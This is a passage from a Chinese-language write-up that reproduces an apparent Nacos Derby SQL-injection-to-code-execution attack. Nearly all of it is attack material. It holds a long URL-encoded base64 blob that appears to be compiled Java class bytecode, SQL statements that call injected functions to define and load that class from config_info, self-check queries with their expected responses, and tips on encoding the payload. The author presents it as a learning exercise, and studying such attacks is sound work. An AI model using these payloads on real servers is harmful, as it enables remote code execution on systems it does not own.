HGQYTATq2ARS2ATBOGQYTATy2ARQ6BRkFtgEwOgQtEwE%2BBL0AHFkDErJTBL0ABFkDKrYBEVO4APxXLRMBQAS9ABxZAxKyUwS9AARZAyq2ARFTuAD8V6cAIToHLRMBQAS9ABxZAxIcUwS9AARZAyy2AEJTuAD8VysTAUIEvQAcWQMttgBCUwS9AARZAy1TuAD8VxkEEwE%2BBL0AHFkDErJTBL0ABFkDKrYBEVO4APxXGQQTAUQEvQAcWQMSslMEvQAEWQMqtgCQU7gA%2FFenACI6CBkEEwFGBL0AHFkDErJTBL0ABFkDKrYAkFO4APxXKxMBSAEBuAD8wAA4wAA4OggZBRkIvgRguAFNwAA4wAA4OgkZCQMZBFMZCAMZCQQZCL64AVErEwFTGQm4AVenABQ6CisTAVO4ALwTAVkZCbgBVxkGEwFbtgEUtgFfAzI6ChkKBLYBYhkKBb0ABFkDK1NZBC1TtgFlOgsrEwFnuAC8wACoOgwZDCq2AREZC7kBawMAV7EABAAoAEUASAAYAIMAnwCiABgA%2BAEVARgAGAFsAXUBeAAYAAEBwAAAAGsACR%2F%2FACgABwcAAgcABAcABAAAAAcBCwABBwAY%2FwAeAAcHAAIHAAQHAAQHAAQHAAQHABwHAQsAAHoHABgd9wBXBwAYHv8AQAAKBwACBwAEBwAEBwAEBwAEBwAcBwELAAcAOAcAOAABBwAYEAHBAAAABAABABgAAQBmAAoAAQG%2FAAAAEAABAAEAAAAEsgBbsAAAAAAACQEXARgAAgG%2FAAAAkQAGAAMAAABvEwFtuAAgTCsTAW8DvQActgA2AQO9AAS2AD5NLLYAQhMBcQS9ABxZAxKyU7YANiwEvQAEWQMqU7YAPsABIsABIrBNEwFzuAAgTCsTAXUEvQAcWQMSslO2ADYrtgEwBL0ABFkDKlO2AD7AASLAASKwAAEAAABAAEEAGAABAcAAAAAIAAH3AEEHABgBwQAAAAQAAQAYAAkBGwEcAAIBvwAAAL8ABQAHAAAAXLsBeVm3AXpMAU27AXxZuwF%2BWSq3AYG3AYRNERAAvAhOLC22AYhZNgSeAA4rLQMVBLYBjKf%2F7Su2AZA6BSzGAAcstgGTK7YBlBkFsDoGLMYAByy2AZMrtgGUGQa%2FAAIACgA8AEsAAABLAE0ASwAAAAEBwAAAAEEABf4AIAcBeQcBfAcBIvwAFQH8AA0HASL%2FAAYAAwcBIgcBeQcBfAABBwAW%2FwAJAAcHASIHAXkHAXwAAAAHABYAAAHBAAAABAABAXcACQD5APoAAwG%2FAAAA2wAEAAcAAACGKsEAHJkACirAABynAAcqtgBCOgQBOgUZBMYAMxkFxwAuLMcAEhkEKwO9ABy2ASg6BacADBkEKyy2ASg6Baf%2F2joGGQS2AZo6BKf%2FzhkFxwAfuwGXWbsAWFm3AFkTAZy2AF8rtgBftgBotwGfvxkFBLYBKRkFKsEAHJkABwGnAAQqLbYAPrAAAQAhAD0AQAGXAAEBwAAAADsACg5DBwAc%2FQAEBwAcBwA6HAhCBwGXCyBSBwA6%2FwAAAAYHAAQHALIHAaEHADgHABwHADoAAgcAOgcABAHBAAAABAABABgBwgAAAAIBlQAJAaIBowACAb8AAABnAAQABAAAAEAqtgBCTSwSBKUAEiwrtgAmsE4stgGaTaf%2F7rsBpVm7AFhZtwBZKrYAQrYA67YAXxMBqbYAXyu2AF%2B2AGi3Aaq%2FAAEACwAQABEBpQABAcAAAAANAAP8AAUHABxLBwGlCAHBAAAABgACAaUBpwAJALkAugACAb8AAAAdAAIAAwAAABEqK7gBrE0sBLYALCwqtgAwsAAAAAABwQAAAAYAAgGlAacACQFUAVUAAgG%2FAAAAHgADAAQAAAASKiu4AaxOLQS2ACwtKiy2Aa%2BxAAAAAAHBAAAABAABABgAAgBiAGMAAQG%2FAAAAgQADAAYAAAA2AU27AXlZtwF6TrsBsVkttwG0TSsstgG4LbYBuToELMYAByy2AboZBLA6BSzGAAcstgG6GQW%2FAAIAAgAeACkAAAApACsAKQAAAAEBwAAAACkAA%2F4AJgcBsQcBeQcAsv8AAgADBwACBwAWBwGxAAEHABb%2BAAkAAAcAFgAIAbsAFAABAb8AAAA2AAIAAAAAAB%2BnABEAEwG9swBbA7MAUqcABwCn%2F%2FEAuwACWbcBvlexAAAAAQHAAAAABQADAw0DAAA%3D
```

![](assets/009.png)

这里有一个细节问题就是字节码需要 URL 编码特殊字符，不然`+`会被直接替换成空格，导致无法初始化

```sql
select count(*) as b,f('org.springframework.boot.loader.xxxx',d((select content from config_info where data_id='testttdb.b64' and group_id='DEFAULT_GROUP' fetch first 1 rows only)),g(),null,n('org.springframework.boot.loader.Launcher')) as a from config_info /*limit*/

select count(*) as b, n('org.springframework.boot.loader.xxxx') as a from config_info /*limit*/
```

![](assets/010.png)
![](assets/011.png)


自检的 SQL

```sql
select count(*) as b,g() as a from config_info /*limit*/
-- {"code":200,...,"A":"jdk.internal.loader.ClassLoaders$AppClassLoader@..."}


select count(*) as b,d('aGVsbG8=') as a from config_info /*limit*/
-- D 能调（base64 解码通道通）


select count(*) as b,n('java.lang.String') as a from config_info /*limit*/
-- A 是 java.lang.String


select count(*) as b,f('x',d('AAAA'),g(),null,n('org.springframework.boot.loader.Launcher')) as a from config_info /*limit*/
-- 500 + ClassFormatError: Invalid ClassFile structure
```

## 小结

之前没打过这个漏洞，当做是学习一下。

---
测试的时候全部是手敲，非常折磨，仿佛一年前照着文章复现 CTF 题目，但是怎么也拿不到 flag 的那种感觉🥹